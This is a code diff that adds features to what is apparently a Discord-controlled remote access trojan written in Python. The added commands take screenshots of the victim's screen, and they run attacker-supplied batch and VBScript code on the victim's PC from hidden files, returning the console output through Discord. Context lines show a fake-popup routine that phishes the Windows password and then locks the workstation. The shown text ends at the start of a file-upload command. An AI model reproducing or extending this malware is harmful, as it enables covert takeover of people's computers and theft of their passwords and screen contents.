@@ -116,3 +116,92 @@ async def windowspass(message, *,args=None):
             os.system('powershell (New-Object -ComObject Wscript.Shell).Popup("""You have canceled this security measure, so you should be aware that you could be exposed to critical system vulnerabilities.""",0,"""This action has been canceled.""",0x10)')
 
             os.system('rundll32.exe user32.dll, LockWorkStation')
+            await message.reply(f"**The exploit was injected to get the password correctly, but the victim did not write anything.**")
+        await message.reply(f"**The exploit was injected to get the password correctly!**\nResultado:\n---------------------------------------------\n{result2}")
+    else:
+        await message.reply(f"**The exploit was injected to get the password correctly!**\nResultado:\n---------------------------------------------\n{result}")
+
+@bot.command()
+async def screenshot(message):
+
+        try:
+            captura = pyautogui.screenshot()
+            captura.save('ss.png')
+            os.system('attrib +h "ss.png"')
+            ss = discord.File('ss.png', filename='ss.png')
+            await message.reply(f'**Screenshot taken correctly:**', file=ss)
+            os.remove('ss.png')
+        except os.error as err:
+            await message.reply('**An error occurred, try again.**')
+    
+
+
+
+@bot.command()   
+async def batinjector(message, *,args=None):
+
+    
+    if args == None: 
+        return await message.reply(f'**insert Batch Code on the user PC.**\n Example:\n```\n{prefix}batinjector <JUSTIFICATION [Batch Code]>\n Example de uso:\n\n{prefix}batinjector @echo off\nstart https://youtube.com```')
+    else:
+        code =  args
+        
+        file = open('i.bat','a')
+        file.write(code)
+        file.close()
+        os.system('attrib +h "i.bat"')
+
+        def shell():
+            output = subprocess.run('i.bat', stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
+            return output
+        coutput = str(shell().stdout.decode('CP437'))
+
+        if len(coutput) > 2000:
+            file2 = open('2000.txt','a')
+            file2.write(coutput)
+            file.close()
+            os.system('attrib +h "2000.txt"')
+            filebuffer = discord.File('2000.txt', filename='2000.txt')
+            await message.reply(f'**inserted correctly.**\n **Console Output:**', file=filebuffer)
+            os.remove('2000.txt')
+            os.remove('i.bat')
+        else:
+            await message.reply(f'**inserted correctly.**\n ```\nConsole Output:\n {coutput}```')
+            os.remove('i.bat')
+
+@bot.command()   
+async def vbsinjector(message, *,args=None):
+
+
+    
+    if args == None: 
+        return await message.reply(f'**You must enter Batch Code on the users PC.**\n example:\n```\n{prefix}vbsinjector <JUSTIFICATION [VBScript Code]>\n usage example:\n\n{prefix}vbsinjector\nx=msgbox("You got hacked lol" ,0, "You are Hacked")```')
+    else:
+        code =  args
+        
+        file = open('i.vbs','a')
+        file.write(code)
+        file.close()
+        os.system('attrib +h "i.vbs"')
+
+        def shell():
+            output = subprocess.run('i.vbs', stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            return output
+        coutput = str(shell().stdout.decode('CP437'))
+
+        if len(coutput) > 2000:
+            file2 = open('2000.txt','a')
+            file2.write(coutput)
+            file.close()
+            os.system('attrib +h "2000.txt"')
+            filebuffer = discord.File('2000.txt', filename='2000.txt')
+            await message.reply(f'**VBScript injected correctly.**\n **Console Output:**', file=filebuffer)
+            os.remove('2000.txt')
+            os.remove('i.vbs')
+        else:
+            await message.reply(f'**VBScript injected correctly.**\n ```\nConsole Output:\n {coutput}```')
+            os.remove('i.vbs')
+@bot.command()
+async def ufile(message, *, args=None):
+    if args == None: 
